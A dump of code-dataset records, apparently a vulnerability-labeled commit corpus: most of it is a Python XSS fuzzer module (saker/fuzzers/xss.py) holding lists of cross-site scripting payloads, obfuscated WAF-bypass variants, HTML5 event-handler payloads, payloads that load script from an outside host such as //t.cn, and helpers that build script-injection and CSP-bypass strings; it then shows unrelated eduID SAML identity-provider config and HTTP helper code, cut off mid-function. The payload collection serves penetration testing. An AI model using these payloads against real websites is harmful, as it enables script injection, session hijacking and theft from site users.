    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x="">""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s="" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'""><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version=""1.0""?><html><script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script></html>',
    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
    'scriptalert(XSS)/script',
    '<a""/onclick=(confirm)()>click',
    '<a/href=javascript&colon;alert()>click',
    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',
    '<d3v/onauxclick=[2].some(confirm)>click',
    '<d3v/onauxclick=(((confirm)))"">click',
    '<d3v/onmouseleave=[2].some(confirm)>click',
    '<details/open/ontoggle=alert()>',
    '<details/open/ontoggle=(confirm)()//'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror=""alert(1)"">',
    '<video onerror=""alert(1)""><source></source></video>',
    '<form><button formaction=""javascript:alert(1)"">X</button>',
    '<math href=""javascript:alert(1)"">CLICKME</math>',
    '<link rel=""import"" href=""test.svg"" />',
    '<iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />',
]


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    reg_payloads = _reg_payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    @classmethod
    def img(cls, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    @classmethod
    def svg(cls, payload):
        return '<svg/onload=""%s""/>' % payload

    @classmethod
    def style(cls, payload):
        return '<style/onload=""%s""></style>' % payload

    @classmethod
    def input(cls, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    @classmethod
    def marquee(cls, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    @classmethod
    def div(cls, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    @classmethod
    def template(cls, tag=""img"", delimiter="" "", event_handler=""onerror"", javascript=""alert(/xss/)"", ending="">""):
        '''
        delimiter "" ""
        delimiter ""\x09""
        delimiter ""\x09\x09""
        delimiter ""/""
        delimiter ""\x0a""
        delimiter ""\x0d""
        delimiter ""/~/""
        ending "">""
        ending ""//""
        ending "" ""
        ending ""\t""
        ending ""\n""
        '''
        return f""<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}""

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
29,9d9faf7de059066aab203f069eade13e89a93b39,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """"""'';!--""<XSS>=&{()}"""""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<svg/onload=eval(window.name)>',
    '<svg/onload=eval(location.hash.slice(1))>',
    '<img src=x onerror=alert(/xss/)>',
    """"""<img src=""javascript:alert('xss');"">"""""",
    """"""<style>@im\\port'\\ja\\vasc\\ript:alert(""xss"")';</style>"""""",
    """"""<img style=""xss:expr/*xss*/ession(alert('xss'))""> """""",
    """"""<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"""""",
    """"""<meta http-equiv=""refresh"" content=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"""""",
    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""""""
]

# payload for waf test
_waf_payloads = [
    ""<IMG SRC=JaVaScRiPt:alert('xss')>"",
    '<<script>alert(""xss"");//<</script>',
    """"""<img src=""javascript:alert('xss')"" """""",
    '<a href=""javascript%26colon;alert(1)"">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'""</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x="">""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s="" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'""><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version=""1.0""?><html><script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script></html>',
    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
    'scriptalert(XSS)/script'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror=""alert(1)"">',
    '<video onerror=""alert(1)""><source></source></video>',
    '<form><button formaction=""javascript:alert(1)"">X</button>',
    '<math href=""javascript:alert(1)"">CLICKME</math>',
    '<link rel=""import"" href=""test.svg"" />',
    '<iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />',
]


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    def img(self, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1
30,e106ab1a6491342c9084772fba9f5c7b29be8d65,"setup.py/n/n#!/usr/bin/env python
#
from setuptools import setup, find_packages
import sys, os
from distutils import versionpredicate

here = os.path.abspath(os.path.dirname(__file__))
README = open(os.path.join(here, 'README')).read()

version = '0.3.23b0'

install_requires = [
    'pymongo>=2.8,<3',
    'pysaml2==1.2.0beta5',
    'python-memcached==1.53',
    'cherrypy==3.2.4',
    'vccs_client==0.4.1',
    'eduid_am>=0.5.3',
]

testing_extras = [
    'nose==1.2.1',
    'coverage==3.6',
]

setup(name='eduid_idp',
      version=version,
      description=""eduID SAML frontend IdP"",
      long_description=README,
      classifiers=[
        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
        ],
      keywords='eduID SAML',
      author='Fredrik Thulin',
      author_email='fredrik@thulin.net',
      license='BSD',
      packages=['eduid_idp',],
      package_dir = {'': 'src'},
      #include_package_data=True,
      #package_data = { },
      zip_safe=False,
      install_requires=install_requires,
      extras_require={
        'testing': testing_extras,
        },
      entry_points={
        'console_scripts': ['eduid_idp=eduid_idp.idp:main',
                            ]
        }
      )
/n/n/nsrc/eduid_idp/config.py/n/n#
# Copyright (c) 2013, 2014 NORDUnet A/S
# All rights reserved.
#
#   Redistribution and use in source and binary forms, with or
#   without modification, are permitted provided that the following
#   conditions are met:
#
#     1. Redistributions of source code must retain the above copyright
#        notice, this list of conditions and the following disclaimer.
#     2. Redistributions in binary form must reproduce the above
#        copyright notice, this list of conditions and the following
#        disclaimer in the documentation and/or other materials provided
#        with the distribution.
#     3. Neither the name of the NORDUnet nor the names of its
#        contributors may be used to endorse or promote products derived
#        from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#
# Author : Fredrik Thulin <fredrik@thulin.net>
#
""""""
Configuration (file) handling for eduID IdP.
""""""

import os
import ConfigParser

_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()
                    'syslog_debug': '0',              # '1' for True, '0' for False
                    'num_threads': '8',
                    'logdir': None,
                    'logfile': None,
                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)
                    'listen_addr': '0.0.0.0',
                    'listen_port': '8088',
                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()
                    'fticks_secret_key': None,
                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',
                    'static_dir': None,
                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters
                    'server_cert': None,  # SSL cert filename
                    'server_key': None,   # SSL key filename
                    'cert_chain': None,   # SSL certificate chain filename, or None
                    'userdb_mongo_uri': None,
                    'userdb_mongo_database': None,
                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes
                    'sso_session_mongo_uri': None,
                    'raven_dsn': None,
                    'content_packages': [],  # List of Python packages (""name:path"") with content resources
                    'verify_request_signatures': '0',  # '1' for True, '0' for False
                    'status_test_usernames': [],
                    'signup_link': '#',         # for login.html
                    'dashboard_link': '#',      # for forbidden.html
                    'password_reset_link': '#', # for login.html
                    'default_language': 'en',
                    'base_url': None,
                    'default_eppn_scope': None,
                    'authn_info_mongo_uri': None,
                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100
                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes
                    'default_scoped_affiliation': None,
                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL
                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag
                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.
                    }

_CONFIG_SECTION = 'eduid_idp'


class IdPConfig(object):

    """"""
    Class holding IdP application configuration.

    Loads configuration from an INI-file at instantiation.

    :param filename: string, INI-file name
    :param debug: boolean, default debug value
    :raise ValueError: if INI-file can't be parsed
    """"""

    def __init__(self, filename, debug):
        self._parsed_content_packages = None
        self._parsed_status_test_usernames = None
        self.section = _CONFIG_SECTION
        _CONFIG_DEFAULTS['debug'] = str(debug)
        cfgdir = os.path.dirname(filename)
        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])
        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)
        if not self.config.read([filename]):
            raise ValueError(""Failed loading config file {!r}"".format(filename))

    @property
    def num_threads(self):
        """"""
        Number of worker threads to start (integer).

        EduID IdP spawns multiple threads to make use of all CPU cores in the password
        pre-hash function.
        Number of threads should probably be about 2x number of cores to 4x number of
        cores (if hyperthreading is available).
        """"""
        return self.config.getint(self.section, 'num_threads')

    @property
    def logdir(self):
        """"""
        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.
        """"""
        res = self.config.get(self.section, 'logdir')
        if not res:
            res = None
        return res

    @property
    def logfile(self):
        """"""
        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.
        """"""
        res = self.config.get(self.section, 'logfile')
        if not res:
            res = None
        return res

    @property
    def syslog_socket(self):
        """"""
        Syslog socket to log to (string). Something like '/dev/log' maybe.
        """"""
        res = self.config.get(self.section, 'syslog_socket')
        if not res:
            res = None
        return res

    @property
    def debug(self):
        """"""
        Set to True to log debug messages (boolean).
        """"""
        return self.config.getboolean(self.section, 'debug')

    @property
    def syslog_debug(self):
        """"""
        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).
        """"""
        return self.config.getboolean(self.section, 'syslog_debug')

    @property
    def listen_addr(self):
        """"""
        IP address to listen on.
        """"""
        return self.config.get(self.section, 'listen_addr')

    @property
    def listen_port(self):
        """"""
        The port the IdP authentication should listen on (integer).
        """"""
        return self.config.getint(self.section, 'listen_port')

    @property
    def pysaml2_config(self):
        """"""
        pysaml2 configuration file. Separate config file with SAML related parameters.
        """"""
        return self.config.get(self.section, 'pysaml2_config')

    @property
    def fticks_secret_key(self):
        """"""
        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data
        on every login.
        """"""
        return self.config.get(self.section, 'fticks_secret_key')

    @property
    def fticks_format_string(self):
        """"""
        Get SAML F-TICKS format string.
        """"""
        return self.config.get(self.section, 'fticks_format_string')

    @property
    def static_dir(self):
        """"""
        Directory with static files to be served.
        """"""
        return self.config.get(self.section, 'static_dir')

    @property
    def ssl_adapter(self):
        """"""
        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)
        """"""
        return self.config.get(self.section, 'ssl_adapter')

    @property
    def server_cert(self):
        """"""
        SSL certificate filename (None == SSL disabled)
        """"""
        return self.config.get(self.section, 'server_cert')

    @property
    def server_key(self):
        """"""
        SSL private key filename (None == SSL disabled)
        """"""
        return self.config.get(self.section, 'server_key')

    @property
    def cert_chain(self):
        """"""
        SSL certificate chain filename
        """"""
        return self.config.get(self.section, 'cert_chain')

    @property
    def userdb_mongo_uri(self):
        """"""
        UserDB MongoDB connection URI (string). See MongoDB documentation for details.
        """"""
        return self.config.get(self.section, 'userdb_mongo_uri')

    @property
    def userdb_mongo_database(self):
        """"""
        UserDB database name.
        """"""
        return self.config.get(self.section, 'userdb_mongo_database')

    @property
    def sso_session_lifetime(self):
        """"""
        Lifetime of SSO session (in minutes).

        If a user has an active SSO session, they will get SAML assertions made
        without having to authenticate again (unless SP requires it through
        ForceAuthn).

        The total time a user can access a particular SP would therefor be
        this value, plus the pysaml2 lifetime of the assertion.
        """"""
        return self.config.getint(self.section, 'sso_session_lifetime')

    @property
    def sso_session_mongo_uri(self):
        """"""
        SSO session MongoDB connection URI (string). See MongoDB documentation for details.

        If not set, an in-memory SSO session cache will be used.
        """"""
        return self.config.get(self.section, 'sso_session_mongo_uri')

    @property
    def raven_dsn(self):
        """"""
        Raven DSN (string) for logging exceptions to Sentry.
        """"""
        return self.config.get(self.section, 'raven_dsn')

    @property
    def content_packages(self):
        """"""
        Get list of tuples with packages and paths to content resources, such as login.html.

        The expected format in the INI file is

            content_packages = pkg1:some/path/, pkg2:foo

        :return: list of (pkg, path) tuples
        """"""
        if self._parsed_content_packages:
            return self._parsed_content_packages
        value = self.config.get(self.section, 'content_packages')
        res = []
        for this in value.split(','):
            this = this.strip()
            name, _sep, path, = this.partition(':')
            res.append((name, path))
        self._parsed_content_packages = res
        return res

    @property
    def verify_request_signatures(self):
        """"""
        Verify request signatures, if they exist.

        This defaults to False since it is a trivial DoS to consume all the IdP:s
        CPU resources if this is set to True.
        """"""
        res = self.config.get(self.section, 'verify_request_signatures')
        return bool(int(res))

    @property
    def status_test_usernames(self):
        """"""
        Get list of usernames valid for use with the /status URL.

        If this list is ['*'], all usernames are allowed for /status.

        :return: list of usernames

        :rtype: list[string]
        """"""
        if self._parsed_status_test_usernames:
            return self._parsed_status_test_usernames
        value = self.config.get(self.section, 'status_test_usernames')
        res = [x.strip() for x in value.split(',')]
        self._parsed_status_test_usernames = res
        return res

    @property
    def signup_link(self):
        """"""
        URL (string) for use in simple templating of login.html.
        """"""
        return self.config.get(self.section, 'signup_link')

    @property
    def dashboard_link(self):
        """"""
        URL (string) for use in simple templating of forbidden.html.
        """"""
        return self.config.get(self.section, 'dashboard_link')

    @property
    def password_reset_link(self):
        """"""
        URL (string) for use in simple templating of login.html.
        """"""
        return self.config.get(self.section, 'password_reset_link')

    @property
    def default_language(self):
        """"""
        Default language code to use when looking for web pages ('en').
        """"""
        return self.config.get(self.section, 'default_language')

    @property
    def base_url(self):
        """"""
        Base URL of the IdP. The default base URL is constructed from the
        Request URI, but for example if there is a load balancer/SSL
        terminator in front of the IdP it might be required to specify
        the URL of the service.
        """"""
        return self.config.get(self.section, 'base_url')

    @property
    def default_eppn_scope(self):
        """"""
        The scope to append to any unscoped eduPersonPrincipalName
        attributes found on users in the userdb.
        """"""
        return self.config.get(self.section, 'default_eppn_scope')

    @property
    def authn_info_mongo_uri(self):
        """"""
        Authn info (failed logins etc.) MongoDB connection URI (string).
        See MongoDB documentation for details.

        If not set, Kantara authn logs will not be maintained.
        """"""
        return self.config.get(self.section, 'authn_info_mongo_uri')

    @property
    def max_authn_failures_per_month(self):
        """"""
        Disallow login for a user after N failures in a given month.

        This is said to be an imminent Kantara requirement.
        """"""
        return self.config.getint(self.section, 'max_authn_failures_per_month')

    @property
    def login_state_ttl(self):
        """"""
        Lifetime of state kept in IdP login phase.

        This is the time, in minutes, a user has to complete the login phase.
        After this time, login cannot complete because the SAMLRequest, RelayState
        and possibly other needed information will be forgotten.
        """"""
        return self.config.getint(self.section, 'login_state_ttl')

    @property
    def default_scoped_affiliation(self):
        """"""
        Add a default eduPersonScopedAffiliation if none is returned from the
        attribute manager.
        """"""
        return self.config.get(self.section, 'default_scoped_affiliation')

    @property
    def vccs_url(self):
        """"""
        URL to use with VCCS client. BCP is to have an nginx or similar on
        localhost that will proxy requests to a currently available backend
        using TLS.
        """"""
        return self.config.get(self.section, 'vccs_url')

    @property
    def insecure_cookies(self):
        """"""
        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).
        """"""
        return self.config.getboolean(self.section, 'insecure_cookies')

    @property
    def httponly_cookies(self):
        """"""
        Set to False to NOT set HTTP Cookie 'httponly' flag (boolean).

        This flag protects against common cross-site scripting (XSS) by
        not allowing client side scripts e.g. JavaScript to access cookies.
        """"""
        return self.config.getboolean(self.section, 'httponly_cookies')
/n/n/nsrc/eduid_idp/mischttp.py/n/n#
# Copyright (c) 2013 NORDUnet A/S
# Copyright 2012 Roland Hedberg. All rights reserved.
# All rights reserved.
#
# See the file eduid-IdP/LICENSE.txt for license statement.
#
# Author : Fredrik Thulin <fredrik@thulin.net>
#          Roland Hedberg
#

""""""
Miscellaneous HTTP related functions.
""""""

import os
import re
import base64
import pprint
import cherrypy
import pkg_resources

from urlparse import parse_qs

import eduid_idp

from saml2 import BINDING_HTTP_REDIRECT


class Redirect(cherrypy.HTTPRedirect):
    """"""
    Class 'copy' just to avoid having references to CherryPy in other modules.
    """"""
    pass


def create_html_response(binding, http_args, start_response, logger):
    """"""
    Create a HTML response based on parameters compiled by pysaml2 functions
    like apply_binding().

    :param binding: SAML binding
    :param http_args: response data
    :param start_response: WSGI-like start_response function
    :param logger: logging logger

    :return: HTML response

    :type binding: string
    :type http_args: dict
    :type start_response: function
    :type logger: logging.Logger
    :rtype: string
    """"""
    if binding == BINDING_HTTP_REDIRECT:
        # XXX This URL extraction code is untested in practice, but it appears
        # the should be HTTP headers in http_args['headers']
        urls = [v for (k, v) in http_args['headers'] if k == 'Location']
        logger.debug('Binding {!r} redirecting to {!r}'.format(binding, urls))
        if 'url' in http_args:
            del http_args['headers']  # less debug log below
            logger.debug('XXX there is also a ""url"" in http_args :\n{!s}'.format(pprint.pformat(http_args)))
            if not urls:
                urls = [http_args.get('url')]
        raise cherrypy.HTTPRedirect(urls)

    # Parse the parts of http_args we know how to parse, and then warn about any remains.
    message = http_args.pop('data')
    status = http_args.pop('status', '200 Ok')
    headers = http_args.pop('headers', [])
    headers_lc = [x[0].lower() for x in headers]
    if 'content-type' not in headers_lc:
        _content_type = http_args.pop('content', 'text/html')
        headers.append(('Content-Type', _content_type))

    if http_args != {}:
        logger.debug('Unknown HTTP args when creating {!r} response :\n{!s}'.format(
            status, pprint.pformat(http_args)))

    start_response(status, headers)
    return message


def geturl(config, query = True, path = True):
    """"""Rebuilds a request URL (from PEP 333).

    :param config: IdP config
    :param query: Is QUERY_STRING included in URI (default: True)
    :param path: Is path included in URI (default: True)

    :type config: eduid_idp.config.IdPConfig
    """"""
    url = [config.base_url]
    if not url[0]:
        # For some reason, cherrypy.request.base always have host 127.0.0.1 -
        # work around that with much more elaborate code, based on pysaml2.
        #return cherrypy.request.base + cherrypy.request.path_info
        url = [cherrypy.request.scheme, '://',
               cherrypy.request.headers['Host'], ':',
               str(cherrypy.request.local.port), '/']
    if path:
        url.append(cherrypy.request.path_info.lstrip('/'))
    if query:
        url.append('?' + cherrypy.request.query_string)
    return ''.join(url)


def get_post():
    """"""
    Return the parsed query string equivalent from a HTML POST request.

    When the method is POST the query string will be sent in the HTTP request body.

    :return: query string

    :rtype: dict
    """"""
    return cherrypy.request.body_params


def get_request_header():
    """"""
    Return the HTML request headers..

    :return: headers

    :rtype: dict
    """"""
    return cherrypy.request.headers


def get_request_body():
    """"""
    Return the request body from a HTML POST request.

    :return: raw body

    :rtype: string
    """"""
    length = cherrypy.request.headers.get('Content-Length', 0)
    if not length:
        # CherryPy 3.2.4 seems to not like length 0 in the read() below
        return ''
    raw_body = cherrypy.request.body.read(int(length))
    return raw_body


def static_filename(config, path):
    """"""
    Check if there is a static file matching 'path'.

    :param config: IdP config
    :param path: URL part to check
    :return: False, None or filename as string

    :type config: eduid_idp.config.IdPConfig
    :type path: string
    :rtype: False | None | string
    """"""
    if not isinstance(path, basestring):
        return False
    if not config.static_dir:
        return False
    try:
        filename = os.path.join(config.static_dir, path)
        os.stat(filename)
        return filename
    except OSError:
        return None


def static_file(start_response, filename, logger, fp=None, status=None):
    """"""
    Serve a static file, 'known' to exist.

    :param start_response: WSGI-like start_response function
    :param filename: OS path to the files whose content should be served
    :param logger: Logging logger
    :param fp: optional file-like object implementing read()
    :param status: optional HTML result data ('404 Not Found' for example)
    :return: file content

    :type start_response: function
    :type filename: string
    :type logger: logging.Logger
    :type fp: File
    :type status: string
    :rtype: string
    """"""
    content_type = get_content_type(filename)
    if not content_type:
        logger.error(""Could not determine content type for static file {!r}"".format(filename))
        raise eduid_idp.error.NotFound()

